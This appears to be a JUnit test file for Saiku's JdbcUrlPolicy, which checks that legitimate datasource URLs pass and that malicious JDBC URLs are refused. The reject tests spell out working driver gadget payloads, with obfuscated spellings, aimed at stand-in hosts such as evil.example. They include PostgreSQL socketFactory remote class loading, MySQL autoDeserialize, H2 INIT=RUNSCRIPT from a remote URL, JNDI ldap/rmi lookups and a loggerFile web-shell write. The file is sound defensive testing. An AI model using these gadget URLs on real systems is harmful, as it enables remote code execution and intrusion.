/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.service.datasource;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import org.junit.After;
import org.junit.Test;

/**
 * saiku#1902: the connection-time policy. Two halves — every legitimate datasource shape Saiku
 * ships or documents must pass (no false positives), and every driver gadget family must be
 * refused, including the obfuscated spellings a driver would still honour.
 */
public class JdbcUrlPolicyTest {

    private static final String PG_GADGET = "jdbc:postgresql://evil.example:5432/db"
            + "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
            + "&socketFactoryArg=http://evil.example/ctx.xml";

    @After
    public void clearOperatorProperty() {
        System.clearProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY);
    }

    /* ------------------------------------------------------------------ accepts */

    @Test
    public void acceptsFoodmartSeedLocation_windows() {
        // The launcher's seeded datasource, exactly as SaikuOlapConnection hands it to the driver
        // (JdbcUser appended, trailing ';', H2 MODE= param inside the inner URL, file: catalog).
        JdbcUrlPolicy.validate("jdbc:mondrian:Jdbc=jdbc:h2:C:/Users/me/saiku-home/data/foodmart;MODE=MySQL;"
                + "Catalog=file:C:/Users/me/saiku-home/data/FoodMart4.xml;JdbcDrivers=org.h2.Driver;JdbcUser=sa;");
    }

    @Test
    public void acceptsFoodmartSeedLocation_unix() {
        JdbcUrlPolicy.validate("jdbc:mondrian:Jdbc=jdbc:h2:/opt/saiku-home/data/foodmart;MODE=MySQL;"
                + "Catalog=file:/opt/saiku-home/data/FoodMart4.xml;JdbcDrivers=org.h2.Driver");
    }

    @Test
    public void acceptsOssieSeedWarehouses() {
        JdbcUrlPolicy.validate("jdbc:h2:/opt/saiku-home/data/tpcds;MODE=PostgreSQL;AUTO_SERVER=TRUE");
        JdbcUrlPolicy.validate("jdbc:h2:mem:flights;DB_CLOSE_DELAY=-1");
        JdbcUrlPolicy.validate("jdbc:quack:/opt/saiku-home/data/warehouse.duckdb");
    }

    @Test
    public void acceptsOrdinaryWarehouseUrls() {
        JdbcUrlPolicy.validate("jdbc:postgresql://db.example.com:5432/warehouse"
                + "?ssl=true&sslmode=verify-full&sslrootcert=/etc/ssl/ca.pem&currentSchema=sales");
        JdbcUrlPolicy.validate("jdbc:mysql://db.example.com:3306/warehouse?useSSL=true&serverTimezone=UTC");
        JdbcUrlPolicy.validate("jdbc:mysql+srv://cluster.example.com/warehouse");
        JdbcUrlPolicy.validate("jdbc:mariadb://db.example.com/warehouse");
        JdbcUrlPolicy.validate("jdbc:sqlserver://db.example.com:1433;databaseName=warehouse;encrypt=true;"
                + "trustServerCertificate=true");
        JdbcUrlPolicy.validate("jdbc:jtds:sqlserver://db.example.com:1433/warehouse");
        JdbcUrlPolicy.validate("jdbc:oracle:thin:@//db.example.com:1521/ORCLPDB1");
        JdbcUrlPolicy.validate("jdbc:hive2://hive.example.com:10000/default;ssl=true?hive.execution.engine=tez");
        JdbcUrlPolicy.validate("jdbc:snowflake://acct.snowflakecomputing.com/?db=WH&warehouse=COMPUTE_WH");
        JdbcUrlPolicy.validate("jdbc:bigquery://https://www.googleapis.com/bigquery/v2:443;ProjectId=p;"
                + "OAuthType=0;OAuthServiceAcctEmail=x@p.iam.gserviceaccount.com;OAuthPvtKeyPath=/etc/key.p12");
        JdbcUrlPolicy.validate("jdbc:clickhouse://ch.example.com:8123/default?compress=1");
        JdbcUrlPolicy.validate("jdbc:duckdb:/data/warehouse.duckdb");
        JdbcUrlPolicy.validate("jdbc:hsqldb:file:/opt/saiku-home/data/hsql;shutdown=true");
    }

    @Test
    public void acceptsLakehouseTrinoExample() {
        // examples/lakehouse-demo/saiku/lakehouse.sds — Trino wants ?user= on the URL.
        JdbcUrlPolicy.validate("jdbc:mondrian:Jdbc=jdbc:trino://localhost:8090/iceberg/sales?user=saiku;"
                + "Catalog=file:/opt/saiku-home/data/LakehouseSales.xml;JdbcDrivers=io.trino.jdbc.TrinoDriver");
    }

    @Test
    public void acceptsXmlaWrapper() {
        JdbcUrlPolicy.validate("jdbc:xmla:Server=http://olap.example.com/xmla;Catalog=Sales");
    }

    @Test
    public void acceptsMondrianJndiDataSourceNames() {
        JdbcUrlPolicy.validate("jdbc:mondrian:DataSource=java:comp/env/jdbc/foodmart;Catalog=file:/x.xml");
        JdbcUrlPolicy.validate("jdbc:mondrian:DataSource=jdbc/foodmart;Catalog=file:/x.xml");
        // The legacy Pentaho OSGi form SaikuOlapConnection rewrites `DataSource=` into.
        JdbcUrlPolicy.validate("jdbc:mondrian4:DataSource=osgi:service/jdbc/foodmart;Catalog=file:/x.xml");
    }

    @Test
    public void acceptsLegacySaiku3MondrianPrefix() {
        JdbcUrlPolicy.validate("Mondrian=4; jdbc:mondrian:Jdbc=jdbc:h2:mem:x;Catalog=file:/x.xml");
    }

    @Test
    public void acceptsQuotedInnerJdbcUrl() {
        JdbcUrlPolicy.validate("jdbc:mondrian:Jdbc='jdbc:h2:mem:x;MODE=MySQL';Catalog=file:/x.xml");
    }

    @Test
    public void acceptsNullAndBlank() {
        JdbcUrlPolicy.validate(null);
        JdbcUrlPolicy.validate("");
        JdbcUrlPolicy.validate("   ");
    }

    @Test
    public void operatorCanExtendTheSchemeAllowList() {
        assertRejected("jdbc:exotic://h/db", "not on the allowed list");
        System.setProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY, " Exotic , other ");
        JdbcUrlPolicy.validate("jdbc:exotic://h/db");
        JdbcUrlPolicy.validate("jdbc:other:whatever");
    }

    /* ------------------------------------------------------------------ rejects: class loading */

    @Test
    public void rejectsPostgresSocketFactoryGadget() {
        assertRejected(PG_GADGET, "socketfactory");
    }

    @Test
    public void rejectsPostgresSocketFactoryGadgetNestedInMondrianWrapper() {
        assertRejected(
                "jdbc:mondrian:Jdbc=" + PG_GADGET
                        + ";Catalog=file:/x.xml;JdbcDrivers=org.postgresql.Driver;JdbcUser=sa;",
                "socketfactory");
    }

    @Test
    public void rejectsPercentEncodedDeniedKey() {
        // pgjdbc decodes query keys itself, so an encoded spelling is honoured by the driver.
        assertRejected("jdbc:postgresql://h/db?socket%46actory=x", "socketfactory");
        assertRejected("jdbc:postgresql://h/db?socket%2546actory=x", "socketfactory");
        assertRejected("jdbc:mysql://h/db?%61utoDeserialize=true", "autodeserialize");
    }

    @Test
    public void rejectsCaseAndSeparatorObfuscatedKeys() {
        // Connector/J looks keys up case-insensitively; a refactor must not regress to exact match.
        assertRejected("jdbc:mysql://h/db?AUTODESERIALIZE=true", "autodeserialize");
        assertRejected("jdbc:mysql://h/db?auto_deserialize=true", "autodeserialize");
        assertRejected("jdbc:postgresql://h/db? socketFactory =x", "socketfactory");
    }

    @Test
    public void rejectsPostgresSslFactoryAndLoggerFile() {
        assertRejected("jdbc:postgresql://h/db?sslfactory=evil.Cls&sslfactoryarg=x", "sslfactory");
        assertRejected("jdbc:postgresql://h/db?loggerLevel=DEBUG&loggerFile=/var/www/shell.jsp", "loggerfile");
        assertRejected(
                "jdbc:postgresql://h/db?authenticationPluginClassName=evil.Cls", "authenticationpluginclassname");
    }

    @Test
    public void rejectsMysqlGadgetFamilies() {
        assertRejected("jdbc:mysql://h/db?autoDeserialize=true&queryInterceptors=evil.Cls", "autodeserialize");
        assertRejected("jdbc:mysql://h/db?queryInterceptors=evil.Cls", "queryinterceptors");
        assertRejected("jdbc:mysql://h/db?statementInterceptors=evil.Cls", "statementinterceptors");
        assertRejected("jdbc:mysql://h/db?allowLoadLocalInfile=true", "allowloadlocalinfile");
        assertRejected("jdbc:mysql://h/db?allowUrlInLocalInfile=true", "allowurlinlocalinfile");
        assertRejected("jdbc:mysql://h/db?propertiesTransform=evil.Cls", "propertiestransform");
        assertRejected("jdbc:mysql://h/db?ha.loadBalanceStrategy=evil.Cls", "loadbalancestrategy");
        assertRejected("jdbc:mysql:loadbalance://h1,h2/db?loadBalanceStrategy=evil.Cls", "loadbalancestrategy");
        assertRejected("jdbc:mariadb://h/db?allowLocalInfile=true", "allowlocalinfile");
    }

    @Test
    public void duckDb_onlyUnsignedOrForeignExtensionLoadingIsRefused() {
        // saiku-cloud's file-upload path uses synthetic jdbc:duckdb:r2:// URLs that rely on the
        // official, signed extension set autoloading (httpfs) — those knobs must stay usable.
        JdbcUrlPolicy.validate("jdbc:duckdb:r2://tenant/uploads/sales.parquet"
                + "?autoload_known_extensions=true&autoinstall_known_extensions=true&extension_directory=/tmp/ext");
        assertRejected("jdbc:duckdb:/data/wh.duckdb?allow_unsigned_extensions=true", "allowunsignedextensions");
        assertRejected(
                "jdbc:quack:/data/wh.duckdb?custom_extension_repository=http://evil/x", "customextensionrepository");
    }

    @Test
    public void rejectsMssqlGadgetFamilies() {
        assertRejected("jdbc:sqlserver://h;socketFactoryClass=evil.Cls;socketFactoryConstructorArg=x", "socketfactory");
        assertRejected("jdbc:sqlserver://h;accessTokenCallbackClass=evil.Cls", "accesstokencallbackclass");
    }

    /* ------------------------------------------------------------------ rejects: H2 */

    @Test
    public void rejectsH2ExecutableTokens() {
        assertRejected("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://e/p.sql'", "INIT=");
        assertRejected("jdbc:h2:mem:x;init = runscript from 'http://e/p.sql'", "INIT=");
        assertRejected("jdbc:h2:mem:x;runscript from 'http://e/p.sql'", "RUNSCRIPT");
        assertRejected("jdbc:h2:mem:x;INIT=CREATE ALIAS EXEC AS $$ String x() { return \"y\"; } $$", "INIT=");
        assertRejected("jdbc:h2:mem:x;CREATE FORCE VIEW v AS SELECT 1", "CREATE ALIAS/TRIGGER/FORCE");
        assertRejected("jdbc:h2:mem:x;SHUTDOWN", "SHUTDOWN");
        assertRejected("jdbc:h2:mem:x;JAVA_OBJECT_SERIALIZER=evil.Cls", "javaobjectserializer");
        assertRejected(
                "jdbc:mondrian:Jdbc=jdbc:h2:./foodmart;INIT=RUNSCRIPT FROM 'http://e/p.sql';Catalog=mondrian://Foodmart;"
                        + "JdbcDrivers=org.h2.Driver",
                "INIT=");
    }

    /* ------------------------------------------------------------------ rejects: Calcite / JNDI */

    @Test
    public void rejectsCalciteModelUrls() {
        assertRejected(
                "jdbc:calcite:model=inline:{\"schemas\":[{\"type\":\"jdbc\",\"jdbcUrl\":\"" + PG_GADGET + "\"}]}",
                "calcite");
        assertRejected("jdbc:calcite:model=/tmp/model.json", "calcite");
        assertRejected("jdbc:mondrian:Jdbc=jdbc:calcite:model=inline:{};Catalog=file:/x.xml", "calcite");
    }

    @Test
    public void rejectsCalciteModelEvenWhenOperatorAllowsTheScheme() {
        System.setProperty(JdbcUrlPolicy.ALLOWED_SCHEMES_PROPERTY, "calcite");
        assertRejected("jdbc:calcite:model=inline:{}", "Calcite model");
        assertRejected("jdbc:calcite:schemaFactory=evil.Cls", "Calcite model");
    }

    @Test
    public void rejectsMondrianJndiUrlDataSource() {
        assertRejected("jdbc:mondrian:DataSource=ldap://evil.example:1389/x;Catalog=file:/x.xml", "JNDI");
        assertRejected("jdbc:mondrian:DataSource=rmi://evil.example:1099/x;Catalog=file:/x.xml", "JNDI");
        assertRejected("jdbc:mondrian:DataSource='ldap://evil.example/x';Catalog=file:/x.xml", "JNDI");
    }

    @Test
    public void rejectsJndiEnvironmentProperties() {
        assertRejected("jdbc:postgresql://h/db?java.naming.factory.initial=evil.Cls", "javanaming");
        assertRejected("jdbc:postgresql://h/db?java.naming.provider.url=ldap://evil/x", "javanaming");
    }

    /* ------------------------------------------------------------------ rejects: structure */

    @Test
    public void rejectsUnknownSchemeAndNonJdbcUrls() {
        assertRejected("jdbc:evil://h/db", "not on the allowed list");
        assertRejected("http://evil.example/x", "must start with jdbc:");
        assertRejected("jdbc:", "malformed");
        assertRejected("jdbc: h2:mem:x", "malformed");
    }

    @Test
    public void rejectsControlCharacters() {
        assertRejected("jdbc:postgresql://h/db?x=1\n&socketFactory=y", "control characters");
        assertRejected("jdbc:postgresql://h/db%0A?socketFactory=y", "control characters");
    }

    @Test
    public void rejectsDuplicateJdbcKeyReinjectedThroughCredentials() {
        // What SaikuOlapConnection would build if a descriptor's username were
        // "sa;Jdbc=jdbc:postgresql://evil/db?socketFactory=X" — Mondrian's property list lets the
        // later key win, so EVERY Jdbc= occurrence must be validated.
        assertRejected(
                "jdbc:mondrian:Jdbc=jdbc:h2:mem:x;Catalog=file:/x.xml;JdbcDrivers=org.h2.Driver;" + "JdbcUser=sa;Jdbc="
                        + PG_GADGET + ";JdbcPassword=p;",
                "socketfactory");
    }

    @Test
    public void rejectionNeverEchoesTheUrl() {
        try {
            JdbcUrlPolicy.validate(PG_GADGET + "&password=hunter2");
            fail("expected rejection");
        } catch (IllegalArgumentException e) {
            assertFalse("host must not leak: " + e.getMessage(), e.getMessage().contains("evil.example"));
            assertFalse(
                    "credential must not leak: " + e.getMessage(),
                    e.getMessage().contains("hunter2"));
        }
    }

    /* ------------------------------------------------------------------ helpers */

    @Test
    public void percentDecodeLeavesPlusAndMalformedEscapesAlone() {
        org.junit.Assert.assertEquals("jdbc:mysql+srv://h/db", JdbcUrlPolicy.percentDecode("jdbc:mysql+srv://h/db"));
        org.junit.Assert.assertEquals("a=b%zz", JdbcUrlPolicy.percentDecode("a=b%zz"));
        org.junit.Assert.assertEquals("socketFactory", JdbcUrlPolicy.percentDecode("socket%2546actory"));
    }

    private static void assertRejected(String url, String expectedReasonFragment) {
        try {
            JdbcUrlPolicy.validate(url);
            fail("expected rejection of: " + url);
        } catch (IllegalArgumentException e) {
            String msg = e.getMessage();
            assertTrue(
                    "rejection should name an invalid JDBC URL, was: " + msg,
                    msg.contains("Invalid datasource JDBC URL"));
            assertTrue(
                    "rejection reason should mention '" + expectedReasonFragment + "', was: " + msg,
                    msg.toLowerCase().contains(expectedReasonFragment.toLowerCase()));
        }
    }
}
